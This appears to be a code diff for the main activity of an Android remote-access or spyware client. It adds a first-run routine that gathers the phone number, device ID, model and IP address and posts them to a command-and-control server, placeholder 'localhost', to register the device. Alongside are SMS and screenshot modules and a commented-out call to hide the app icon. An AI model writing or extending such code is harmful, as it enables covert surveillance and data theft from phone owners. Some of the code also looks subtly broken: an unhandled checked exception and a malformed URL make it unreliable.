@@ -7,9 +7,12 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.content.ComponentName;
+import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
+import android.os.AsyncTask;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
@@ -22,8 +25,18 @@ import com.ot.grhq.client.functionality.SMS;
 import com.ot.grhq.client.functionality.Screenshot;
 import com.ot.grhq.client.functionality.Utils;
 
+import org.json.JSONException;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
 import java.io.File;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.nio.charset.StandardCharsets;
 import java.util.List;
 import java.util.Map;
 
@@ -44,6 +57,10 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.REQUEST_INSTALL_PACKAGES
     };
 
+    private SharedPreferences preferences;
+
+    private final String C2_SERVER = "https://localhost/";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -51,10 +68,11 @@ public class MainActivity extends AppCompatActivity {
 
         checkPermissions();
 
-        Log.d("eeee", Utils.deviceID(getApplicationContext()));
-        Log.d("eeee", Utils.ipAddress());
-        Log.d("eeee", Utils.phoneNumber(getApplicationContext()));
-        Log.d("eeee", String.valueOf(Utils.clientID(getApplicationContext())));
+        if (isFirstTime()) {
+            try {
+                setClientID();
+            } catch (JSONException e) {}
+        }
 
 //        hideApplicationIcon();
         startService(new Intent(this, MainService.class));
@@ -105,12 +123,121 @@ public class MainActivity extends AppCompatActivity {
             requestPermissions(new String[] { permission }, PERMISSION_REQUEST_CODE);
     }
 
+    /**
+     * Check if this is the application first startup
+     * @return true if first time; false otherwise
+     */
+    private boolean isFirstTime() {
+        preferences = getApplicationContext().getSharedPreferences("data", Context.MODE_PRIVATE);
+        int val = preferences.getInt("client_id", -1);
+
+        if (val == -1)
+            return true;
+
+        return false;
+    }
+
+    /**
+     * Get client ID from c2
+     */
+    private void setClientID() throws JSONException {
+        String url = C2_SERVER + "/client";
+
+        JSONObject json = new JSONObject();
+        json.put("phone", Utils.phoneNumber(getApplicationContext()));
+        json.put("device_api", Utils.deviceAPI());
+        json.put("device_id", Utils.deviceID(getApplicationContext()));
+        json.put("device_model", Utils.deviceModel());
+        json.put("ip_address", Utils.ipAddress());
+
+        ClientID clientID = new ClientID(url, json.toString(), result -> {
+            int clientId = -1;
+            JSONObject response = new JSONObject(result);
+            clientId = response.getInt("client_id");
+
+            preferences = getApplicationContext().getSharedPreferences("data", Context.MODE_PRIVATE);
+            SharedPreferences.Editor editor =  preferences.edit();
+            editor.putInt("client_id", clientId);
+            editor.apply();
+        });
+
+        clientID.execute();
+    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         for (int result : grantResults) {
             if (result != PackageManager.PERMISSION_GRANTED)
                 finishAffinity();
+        }
+    }
+
+    private static class ClientID extends AsyncTask<Void, Void, String> {
+
+        private String postURL;
+        private String json;
+        private PostDataListener listener;
+
+        public ClientID(String postURL, String json, PostDataListener listener) {
+            this.postURL = postURL;
+            this.json = json;
+            this.listener = listener;
+        }
+
+        public interface PostDataListener {
+            void onDataPosted(String result) throws JSONException;
+        }
+
+        @Override
+        protected String doInBackground(Void... voids) {
+            HttpURLConnection urlConnection = null;
+            BufferedReader reader = null;
+            String jsonResponse = null;
+
+            try {
+                URL url = new URL(postURL);
+                urlConnection = (HttpURLConnection) url.openConnection();
+                urlConnection.setRequestMethod("POST");
+                urlConnection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                urlConnection.setDoOutput(true);
+
+                DataOutputStream dataOutputStream = new DataOutputStream(urlConnection.getOutputStream());
+                dataOutputStream.write(json.getBytes(StandardCharsets.UTF_8));
+                dataOutputStream.flush();
+                dataOutputStream.close();
+
+                InputStream inputStream = urlConnection.getInputStream();
+                if (inputStream != null) {
+                    reader = new BufferedReader(new InputStreamReader(inputStream));
+                    StringBuilder responseStringBuilder = new StringBuilder();
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        responseStringBuilder.append(line).append("\n");
+                    }
+                    jsonResponse = responseStringBuilder.toString();
+                }
+            } catch (IOException e) {
+            } finally {
+                if (urlConnection != null) {
+                    urlConnection.disconnect();
+                }
+                if (reader != null) {
+                    try {
+                        reader.close();
+                    } catch (IOException e) {
+                    }
+                }
+            }
+
+            return jsonResponse;
+        }
+
+        @Override
+        protected void onPostExecute(String result) {
+            if (listener != null) {
+                listener.onDataPosted(result);
+            }
         }
     }
 }
